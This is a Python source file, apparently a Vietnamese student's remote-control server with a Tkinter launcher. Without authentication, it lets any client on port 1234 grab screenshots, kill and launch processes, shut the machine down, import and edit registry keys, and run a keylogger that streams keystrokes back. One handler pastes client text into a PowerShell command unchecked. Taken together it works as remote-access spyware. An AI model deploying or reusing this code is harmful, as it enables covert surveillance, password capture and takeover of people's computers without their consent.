from pathlib import Path
from threading import Thread
import socket
import json
import os
import wmi
import pyautogui
import psutil
import winreg as _winreg
import winreg as winreg
import pynput # for key stroke
from pynput.keyboard import Key, Listener, Controller
import time
from tkinter import *
from tkinter import font
import tkinter as tk
from tkinter import messagebox
import sys
import cv2
import pickle
import numpy as np
import struct ## new

def Keystroke(Client):
    Keyboards = Controller()
    Stop = True
    ListKeys = []
    def StopHook():
        nonlocal Stop
        while True:
            if Stop == True:
                try:
                    while True:                       
                        checkdata = Client.recv(1024).decode("utf-8")
                        if checkdata == "UnhookKey":                
                            print(Stop) 
                            Stop = False
                            break
                finally:
                    Keyboards.release(Key.space)
            break

    def KeyLogger():
        while True:
            def Pressing(logger): #Nhận phím
                nonlocal ListKeys
                ListKeys.append(logger)
            def Releasing(logger):
                print(Stop)# Điều kiện ngừng vòng lặp
                if Stop == False: listener.stop()
            with Listener(on_release = Releasing, on_press = Pressing) as listener:
                listener.join()
            def Writing(ListKeys):
                global count
                logging = ''
                count = 0
                for logger in ListKeys:
                    temp = str(logger).replace("'","")
                    
                    if(str(temp) == "Key.space"): temp = " "
                    elif(str(temp) == "Key.backspace"): temp = "Backspace"
                    elif(str(temp) == "Key.shift"): temp = ""

                    temp = str(temp).replace("Key.",'')
                    temp = str(temp).replace("Key.cmd","")

                    if(str(temp) == "<96>"): temp = "0"
                    elif(str(temp) == "<97>"): temp = "1"
                    elif(str(temp) == "<98>"): temp = "2"
                    elif(str(temp) == "<99>"): temp = "3"
                    elif(str(temp) == "<100>"): temp = "4"
                    elif(str(temp) == "<101"): temp = "5"
                    elif(str(temp) == "<102>"): temp = "6"
                    elif(str(temp) == "<103>"): temp = "7"
                    elif(str(temp) == "<104>"): temp = "8"
                    elif(str(temp) == "<105>"): temp = "9"

                    temp = str(temp).replace("<home>","Home")
                    temp = str(temp).replace("<esc>","ESC")
                    temp = str(temp).replace("<tab>","")
                    temp = str(temp).replace("<cmd>","fn")
                    temp = str(temp).replace("<enter>","Enter")
                    temp = str(temp).replace("<caps_lock>","")
                    temp = str(temp).replace("<shift_l>","")
                    temp = str(temp).replace("<shift_r>","")
                    temp = str(temp).replace("<ctrl_l>","")
                    temp = str(temp).replace("<num_lock>","")
                    temp = str(temp).replace("<ctrl_r>","")
                    temp = str(temp).replace("<alt_l>","")
                    temp = str(temp).replace("<alt_gr>","")
                    temp = str(temp).replace("<delete>","Del")
                    temp = str(temp).replace("<print_screen>","PrtSc")

                    temp = str(temp).replace("home","Home")
                    temp = str(temp).replace("esc","ESC")
                    temp = str(temp).replace("tab","")
                    temp = str(temp).replace("cmd","fn")
                    temp = str(temp).replace("enter","Enter")
                    temp = str(temp).replace("caps_lock","")
                    temp = str(temp).replace("shift_l","")
                    temp = str(temp).replace("shift_r","")
                    temp = str(temp).replace("ctrl_l","")
                    temp = str(temp).replace("num_lock","")
                    temp = str(temp).replace("ctrl_r","")
                    temp = str(temp).replace("alt_l","")
                    temp = str(temp).replace("alt_gr","")
                    temp = str(temp).replace("delete","Del")
                    temp = str(temp).replace("print_screen","PrtSc")
                    
                    logging += temp
                    count+=1
                    print(logging)
                return logging[0:]
            data = Writing(ListKeys)
            if data == "": data = " "
            print(data)
            Client.sendall(bytes(data,"utf-8"))
            checkdata = Client.recv(1024).decode("utf-8")
            ListKeys.clear()
            break
    threadingLogger = Thread(target = KeyLogger)
    threadingStop = Thread(target = StopHook)
    threadingStop.start()
    threadingLogger.start()
    threadingLogger.join()

def ReceiveRegistry(Client):
    import subprocess    
    Client.sendall(bytes("Xac nhan","utf-8"))
    data = Client.recv(1024).decode("utf-8")
    Client.sendall(bytes("Xac nhan","utf-8"))
    fileopen = open("File.reg","w")
    fileopen.write(data)
    cmd = 'powershell reg import File.reg'
    subprocess.Popen(cmd, shell=True)

def GetValueReg(Client):
    Name = Client.recv(1024).decode("utf-8")
    Client.sendall(bytes("Xac nhan","utf-8"))
    Links = Client.recv(1024).decode("utf-8")
    Client.sendall(bytes("Xac nhan","utf-8"))
    Reg = Links.split("\\",1)
    check = True
    if Reg[0] == "HKEY_CLASSES_ROOT": linkReg = winreg.HKEY_CLASSES_ROOT
    elif Reg[0] == "HKEY_CURRENT_USER": linkReg = winreg.HKEY_CURRENT_USER
    elif Reg[0] == "HKEY_LOCAL_MACHINE": linkReg = winreg.HKEY_LOCAL_MACHINE
    elif Reg[0] == "HKEY_USERS": linkReg = winreg.HKEY_USERS
    elif Reg[0] == "HKEY_CURRENT_CONFIG": linkReg = winreg.HKEY_CURRENT_CONFIG
    else:
        Client.sendall(bytes("Sai duong dan", "utf-8"))
        checkdata = Client.recv(1024).decode("utf-8")
        return
    REG_PATH = Reg[1]    
    with winreg.ConnectRegistry(None, linkReg) as REG_LINK:
        try:
            with winreg.OpenKey(REG_LINK, REG_PATH, 0, winreg.KEY_READ) as REG_KEY:
                i = 0
                while True:
                    try:
                        value = winreg.EnumValue(REG_KEY, i)
                        if value[0] == Name: 
                            Client.sendall(bytes(value[1],"utf-8"))
                            checkdata = Client.recv(1024).decode("utf-8")
                            break
                        i += 1
                    except:
                        Client.sendall(bytes("Khong tim thay", "utf-8"))
                        check = Client.recv(1024).decode("utf-8")
                        break
            winreg.CloseKey(REG_KEY)
        except WindowsError:
            Client.sendall(bytes("Sai duong dan", "utf-8"))
            checkdata = Client.recv(1024).decode("utf-8")
    
def SetValue(Client):
    Name = Client.recv(1024).decode("utf-8")
    Client.sendall(bytes("Xac nhan","utf-8"))
    Links = Client.recv(1024).decode("utf-8")
    Client.sendall(bytes("Xac nhan","utf-8"))
    data_type = Client.recv(1024).decode("utf-8")
    Client.sendall(bytes("xac nhan","utf-8"))
    Value = Client.recv(2048).decode("utf-8")
    Client.sendall(bytes("Xac nhan","utf-8"))

    Reg = Links.split("\\", 1)
    check = True
    if Reg[0] == "HKEY_CLASSES_ROOT": linkReg = winreg.HKEY_CLASSES_ROOT
    elif Reg[0] == "HKEY_CURRENT_USER": linkReg = winreg.HKEY_CURRENT_USER
    elif Reg[0] == "HKEY_LOCAL_MACHINE": linkReg = winreg.HKEY_LOCAL_MACHINE
    elif Reg[0] == "HKEY_USERS": linkReg = winreg.HKEY_USERS
    elif Reg[0] == "HKEY_CURRENT_CONFIG": linkReg = winreg.HKEY_CURRENT_CONFIG
    else:
        Client.sendall(bytes("Sai duong dan", "utf-8"))
        checkdata = Client.recv(1024).decode("utf-8")
        return
    REG_PATH = Reg[1]
    with winreg.ConnectRegistry(None, linkReg) as REG_LINK:
        try:
            with winreg.OpenKey(REG_LINK, REG_PATH, 0, winreg.KEY_WRITE) as REG_KEY:
                if data_type == "String": 
                    winreg.SetValueEx(REG_KEY, Name, 0, winreg.REG_SZ,Value)
                elif data_type == "Binary": 
                    winreg.SetValueEx(REG_KEY, Name, 0, winreg.REG_BINARY,Value.encode('latin-1'))
                elif data_type == "DWORD": 
                    winreg.SetValueEx(REG_KEY, Name, 0, winreg.REG_DWORD,int(Value))
                elif data_type == "QWORD": 
                    winreg.SetValueEx(REG_KEY, Name, 0, winreg.REG_QWORD,int(Value))
                elif data_type == "Multi-string": 
                    arr = value.split()
                    winreg.SetValueEx(REG_KEY, Name, 0, winreg.REG_MULTI_SZ,arr)
                elif data_type == "Expandable String": 
                    winreg.SetValueEx(REG_KEY, Name, 0, winreg.REG_EXPAND_SZ,Value)
                else:
                    Client.sendall(bytes("fail", "utf-8"))
                    checkdata = Client.recv(1024).decode("utf-8")    
                    return
                Client.sendall(bytes("succeed", "utf-8"))
                checkdata = Client.recv(1024).decode("utf-8")
            winreg.CloseKey(REG_KEY)  
        except WindowsError:
            Client.sendall(bytes("Sai duong dan", "utf-8"))
            checkdata = Client.recv(1024).decode("utf-8")

def DeleteRegValue(Client):
    temp = 0
    test = True
    def DeleteTemp(REG_KEY, REG_SUB, Name):
        REG_KEY = winreg.OpenKey(REG_KEY, REG_SUB ,0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(REG_KEY, Name)
        winreg.CloseKey(REG_KEY)
               
    Links = Client.recv(1024).decode("utf-8")
    REG_SUB = Links
    Client.sendall(bytes("Xac nhan","utf-8"))
    Reg = Links.split("\\",1)
    
    if Reg[0] == "HKEY_CLASSES_ROOT":
        temp = 18
        linkReg = winreg.HKEY_CLASSES_ROOT

    elif Reg[0] == "HKEY_CURRENT_USER":
        temp = 18
        linkReg = winreg.HKEY_CURRENT_USER

    elif Reg[0] == "HKEY_LOCAL_MACHINE":
        temp = 19
        linkReg = winreg.HKEY_LOCAL_MACHINE

    elif Reg[0] == "HKEY_USERS":
        temp = 11
        linkReg = winreg.HKEY_USERS

    elif Reg[0] == "HKEY_CURRENT_CONFIG":
        temp = 20
        linkReg = winreg.HKEY_CURRENT_CONFIG

    else:
        test = False

    Name = Client.recv(1024).decode("utf-8")
    Client.sendall(bytes("Xac nhan","utf-8"))

    if test == True:
        try:
            REG_LINK = winreg.ConnectRegistry(None, linkReg)
            REG_SUB = REG_SUB[temp:]
            DeleteTemp(REG_LINK, REG_SUB, Name)  

        except WindowsError:
            test = False

    Receives = Client.recv(1024).decode("utf-8")
    if test == True:      
        Client.sendall(bytes("Xoa value thanh cong","utf-8"))  
    elif test == False:
        Client.sendall(bytes("Sai duong dan", "utf-8"))
    
    Confirmation = Client.recv(1024).decode("utf-8")    

def CreateKey(Client):
    Links = Client.recv(1024).decode("utf-8")
    Client.sendall(bytes("Ok Nhan Link","utf-8"))
    Reg = Links.split("\\",1)

    if Reg[0] == "HKEY_CLASSES_ROOT": linkReg = winreg.HKEY_CLASSES_ROOT
    elif Reg[0] == "HKEY_CURRENT_USER": linkReg = winreg.HKEY_CURRENT_USER
    elif Reg[0] == "HKEY_LOCAL_MACHINE": linkReg = winreg.HKEY_LOCAL_MACHINE
    elif Reg[0] == "HKEY_USERS": linkReg = winreg.HKEY_USERS
    elif Reg[0] == "HKEY_CURRENT_CONFIG": linkReg = winreg.HKEY_CURRENT_CONFIG
    else:
        Client.sendall(bytes("Sai duong dan", "utf-8"))
        checkdata = Client.recv(1024).decode("utf-8")
        return

    REG_PATH = Reg[1]
    REG_LINK = winreg.ConnectRegistry(None, linkReg)
    REG_KEY = winreg.OpenKey(REG_LINK, r"",0,winreg.KEY_ALL_ACCESS)    
    REG_CREATE = winreg.CreateKeyEx(REG_KEY, REG_PATH, 0, winreg.KEY_ALL_ACCESS)
    Client.sendall(bytes("Da tao thanh cong","utf-8"))
    checkdata = Client.recv(1024).decode("utf-8")

def DeleteKey(Client):
    Links = Client.recv(1024).decode("utf-8")
    Client.sendall(bytes("Ok Nhan Link","utf-8"))
    Reg = Links.split("\\",1)
    
    if Reg[0] == "HKEY_CLASSES_ROOT": linkReg = winreg.HKEY_CLASSES_ROOT
    elif Reg[0] == "HKEY_CURRENT_USER": linkReg = winreg.HKEY_CURRENT_USER
    elif Reg[0] == "HKEY_LOCAL_MACHINE": linkReg = winreg.HKEY_LOCAL_MACHINE
    elif Reg[0] == "HKEY_USERS": linkReg = winreg.HKEY_USERS
    elif Reg[0] == "HKEY_CURRENT_CONFIG": linkReg = winreg.HKEY_CURRENT_CONFIG
    else:
        Client.sendall(bytes("Sai duong dan", "utf-8"))
        checkdata = Client.recv(1024).decode("utf-8")
        return
    
    def DeleteRegKey(REG_LINK, REG_PATH):
        REG_KEY = winreg.OpenKey(REG_LINK, REG_PATH ,0, winreg.KEY_ALL_ACCESS)
        REG_DATA = winreg.QueryInfoKey(REG_KEY)
        for registry in range(0, REG_DATA[0]):
            REG_SUB = winreg.EnumKey(REG_KEY, 0)
            try:
                winreg.DeleteKey(REG_KEY, REG_SUB)
            except:
                DeleteRegKey(REG_LINK, REG_PATH)
        winreg.DeleteKey(REG_KEY,"")
        winreg.CloseKey(REG_KEY)
        access = winreg.ConnectRegistry(None, linkReg)
        Client.sendall(bytes("Da xoa thanh cong","utf-8"))
        checkdata = Client.recv(1024).decode("utf-8")

    try:
        DeleteRegKey(linkReg, Reg[1])
    except:
        Client.sendall(bytes("Sai duong dan", "utf-8"))
        checkdata = Client.recv(1024).decode("utf-8")
        return     

def readRequest (Client):
    request =""
    try:
        request = Client.recv(1024).decode('utf-8')
        # recieve request from client
    finally:
        return request

 #ACCEPT_THREAD = Thread(target = waitingConnection())
# Choose a port that is free
def broadcast(msg, prefix=""):  
    for sock in clients:
        sock.send(bytes(prefix, "utf-8") + msg)

def takeRequest (Client):
    while True:
        Request = readRequest(Client)
        print(Request)
        if not Request:
            Client.close()
            break
        print("--> Got a request\n")
        #Chụp màn hình rồi gửi lại cho client
        if "TakePicture" == Request:
            image = pyautogui.screenshot()
            #image = image.resize((600,600)) 
            image.save("scrshot.png")
            try:
                # open image ======
                myfile = open('scrshot.png', 'rb')
                bytess = myfile.read()
                #gửi dữ liệu cho ảnh
                Client.sendall(bytess)
                myfile.close()
            except:
                print("Khong the chup man hinh")
        elif "Shutdown" == Request:
            os.system("shutdown /s /t 30")
            Client.send(bytes("Da tat may", "utf-8"))
            print("ShutDown")
        elif "ProcessRunning" == Request:
            print("ProcessRunning")
            '''c=0
            Name = ['' for i in range(100000)]
            ID = ['' for i in range(100000)]
            Thread = ['' for i in range(100000)]
            for process in psutil.process_iter ():
                c = c+1
                Name[c] = str(process.name ())
                ID[c] = str(process.pid)
                Thread[c] = str(process.num_threads())

            Client.sendall(bytes(str(c), "utf-8"))
            for i in range(c):
                Client.sendall(bytes(ID[i],"utf-8"))
                checkdata = Client.recv(1024)
            for i in range(c):
                Client.sendall(bytes(Name[i], "utf-8"))
                checkdata = Client.recv(1024)
            for i in range(c):
                Client.sendall(bytes(Thread[i], "utf-8"))
                checkdata = Client.recv(1024)'''
            import subprocess
            cmd = 'powershell "Get-Process |Select-Object id, name, @{Name=\'ThreadCount\';Expression ={$_.Threads.Count}}| format-table'
            ProccessProc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
            count = 0
            length = 0
            Name = ['' for i in range(100000)]
            ID = ['' for i in range(100000)]
            Thread = ['' for i in range(100000)]
            for line in ProccessProc.stdout:
                if line.rstrip():
                    if count < 2:
                        count += 1
                        continue
                    msg = str(line.decode().rstrip().lstrip())
                    msg = " ".join(msg.split())
                    lists = msg.split(" ", 3)
                    ID[length] = lists[0]
                    Name[length] = lists[1]
                    Thread[length] = lists[2]
                    length += 1

            Client.sendall(bytes(str(length),"utf-8"))

            for i in range(length):
                Client.sendall(bytes(ID[i],"utf-8"))
                checkdata = Client.recv(1024)
            for i in range(length):
                Client.sendall(bytes(Name[i], "utf-8"))
                checkdata = Client.recv(1024)
            for i in range(length):
                Client.sendall(bytes(Thread[i], "utf-8"))
                checkdata = Client.recv(1024)

        elif "KillTask" == Request: #Xóa
            print("KillTask")
            m = Client.recv(1024)
            msg = str(m)
            msg = msg[2:]
            msg = msg[:len(msg)-1]
            print(str(msg))
            from subprocess import call
            taskkillexe = "c:/windows/system32/taskkill.exe"
            taskkillparam = (taskkillexe, '/F',  '/IM', msg + '.exe')
            taskkillexitcode = call(taskkillparam)
            Client.send(bytes("Da xoa tac vu", "utf-8"))
        elif "OpenTask" == Request: #Mở app
            print("OpenTask")
            import subprocess
            mode = 0o666
            flags = os.O_RDWR | os.O_CREAT
            m = Client.recv(1024)
            msg = str(m)
            msg = msg[2:]
            msg = msg[:len(msg)-1]
            print(str(msg))
            print("C:/Windows/System32/" + msg + ".exe")
            cmd = 'powershell start ' + msg
            subprocess.call(cmd)
            #os.system("C:/Windows/System32/" + msg + ".exe")
            Client.send(bytes("Da mo", "utf-8"))

        elif "AppRunning" == Request:
            print("AppRunning")
            import subprocess
            cmd = 'powershell "Get-Process |where {$_.mainWindowTItle} |Select-Object id, name, @{Name=\'ThreadCount\';Expression ={$_.Threads.Count}}| format-table'
            appProc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
            count = 0
            length = 0
            Name = ['' for i in range(100)]
            ID = ['' for i in range(100)]
            Thread = ['' for i in range(100)]
            for line in appProc.stdout:
                if line.rstrip():
                    if count < 2:
                        count += 1
                        continue
                    msg = str(line.decode().rstrip().lstrip())
                    msg = " ".join(msg.split())
                    lists = msg.split(" ", 3)
                    ID[length] = lists[0]
                    Name[length] = lists[1]
                    Thread[length] = lists[2]
                    length += 1

            Client.sendall(bytes(str(length),"utf-8"))

            for i in range(length):
                Client.sendall(bytes(ID[i],"utf-8"))
                checkdata = Client.recv(1024)
            for i in range(length):
                Client.sendall(bytes(Name[i], "utf-8"))
                checkdata = Client.recv(1024)
            for i in range(length):
                Client.sendall(bytes(Thread[i], "utf-8"))
                checkdata = Client.recv(1024)
        elif "SendingReg" == Request: ReceiveRegistry(Client)
        elif "GettingValueReg" == Request: GetValueReg(Client)
        elif "SettingValueReg" == Request: SetValue(Client)
        elif "DeletingValueReg" == Request: DeleteRegValue(Client)
        elif "CreatingKey" == Request: CreateKey(Client)
        elif "DeletingKey" == Request: DeleteKey(Client)
        elif "HookKey" == Request:
            print("KeyStroke")
            Client.sendall(bytes("Đã nhận", "utf-8"))
            Keystroke(Client)

        elif "Exit" == Request:
            print("Exit")
            Client.sendall(bytes("Đã thoát", "utf-8"))
            # server.close()
            break

def waitingConnection():

    print("Waiting for Client")
    
    while True:
        client, Address = SERVER.accept()
        print("Client", Address, "connected!")
        Thread(target = takeRequest, args = (client,)).start()


SERVER =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
SERVER.bind((socket.gethostbyname(socket.gethostname()), 1234))
print("server is working on ", (socket.gethostbyname(socket.gethostname())))
def action():
    try:
        SERVER.listen()
        ACCEPT_THREAD = Thread(target = waitingConnection())
        ACCEPT_THREAD.start()
        ACCEPT_THREAD.join()
    except:
        print("Error occured!")
    finally:

        SERVER.close()
def main():
     top = Tk()
     top.title("Server")
     top.geometry("150x150")
     top.button = Button(top, text ="Mở Server",font=('Arial Bold', 13), command = action, bd = 10, bg='#c4ceff', activebackground='#8fa2ff' )
     top.button.pack(fill=BOTH, pady=5, padx=5, expand=True)
     top.mainloop()

if __name__ == "__main__":
    main()
   